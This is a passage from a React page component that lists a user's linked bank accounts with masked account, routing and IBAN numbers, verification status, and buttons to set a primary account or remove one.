          {linkedBanks.length === 0 && !showForm ? (
            <div style={styles.emptyState}>
              <div style={{ fontSize: '3rem', marginBottom: '1rem' }}>🏦</div>
              <p style={{ fontSize: '1.125rem', marginBottom: '0.5rem', fontWeight: '600' }}>No linked bank accounts yet</p>
              <p style={{ color: '#64748b', marginBottom: '1rem' }}>Connect your bank account to enable fast withdrawals and transfers</p>
              <p style={{ fontSize: '0.875rem', color: '#999', marginTop: '1rem' }}>✓ Bank-level security &nbsp; | &nbsp; ✓ Instant verification &nbsp; | &nbsp; ✓ 24/7 Support</p>
            </div>
          ) : (
            linkedBanks.map(bank => (
              <div key={bank.id} style={styles.bankItem}>
                <div style={styles.bankHeader}>
                  <div style={styles.bankName}>{bank.bank_name}</div>
                  {bank.is_primary && (
                    <div style={styles.primaryBadge}>PRIMARY</div>
                  )}
                </div>

                <div style={styles.bankDetails}>
                  <div style={styles.detailItem}>
                    <div style={styles.detailLabel}>Account Holder</div>
                    <div style={styles.detailValue}>{bank.account_holder_name}</div>
                  </div>
                  <div style={styles.detailItem}>
                    <div style={styles.detailLabel}>Account Type</div>
                    <div style={styles.detailValue}>{bank.account_type.toUpperCase()}</div>
                  </div>
                  <div style={styles.detailItem}>
                    <div style={styles.detailLabel}>Account Number</div>
                    <div style={styles.detailValue}>••••{bank.account_number.slice(-4)}</div>
                  </div>
                  {bank.account_region === 'US' && bank.routing_number && (
                    <div style={styles.detailItem}>
                      <div style={styles.detailLabel}>Routing Number</div>
                      <div style={styles.detailValue}>•••••{bank.routing_number.slice(-4)}</div>
                    </div>
                  )}
                  {bank.account_region === 'INTERNATIONAL' && bank.swift_code && (
                    <div style={styles.detailItem}>
                      <div style={styles.detailLabel}>SWIFT Code</div>
                      <div style={styles.detailValue}>{bank.swift_code}</div>
                    </div>
                  )}
                  <div style={styles.detailItem}>
                    <div style={styles.detailLabel}>Status</div>
                    <div style={{
                      ...styles.detailValue,
                      color: bank.status === 'active' ? '#059669' : '#f59e0b',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '0.5rem'
                    }}>
                      <span style={{ fontSize: '1rem' }}>
                        {bank.status === 'active' ? '✅' : '⏳'}
                      </span>
                      {bank.status === 'active' ? 'VERIFIED' : 'PENDING VERIFICATION'}
                    </div>
                  </div>
                  {bank.account_region === 'INTERNATIONAL' && bank.iban && (
                    <div style={styles.detailItem}>
                      <div style={styles.detailLabel}>IBAN</div>
                      <div style={styles.detailValue}>••••{bank.iban.slice(-6)}</div>
                    </div>
                  )}
                  {bank.country && (
                    <div style={styles.detailItem}>
                      <div style={styles.detailLabel}>Country</div>
                      <div style={styles.detailValue}>{bank.country}</div>
                    </div>
                  )}
                  <div style={styles.detailItem}>
                    <div style={styles.detailLabel}>Linked Date</div>
                    <div style={styles.detailValue}>
                      {new Date(bank.created_at).toLocaleDateString()}
                    </div>
                  </div>
                </div>

                <div style={styles.buttonGroup}>
                  {!bank.is_primary && (
                    <button
                      onClick={() => handleSetPrimary(bank.id)}
                      style={styles.buttonSecondary}
                    >
                      Set as Primary
                    </button>
                  )}
                  <button
                    onClick={() => handleDelete(bank.id)}
                    style={styles.buttonDanger}
                  >
                    Remove
                  </button>
                </div>
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
}

export default function LinkBankAccount() {
  return (
    <ProtectedRoute>
      <LinkBankAccountContent />
    </ProtectedRoute>
  );
}
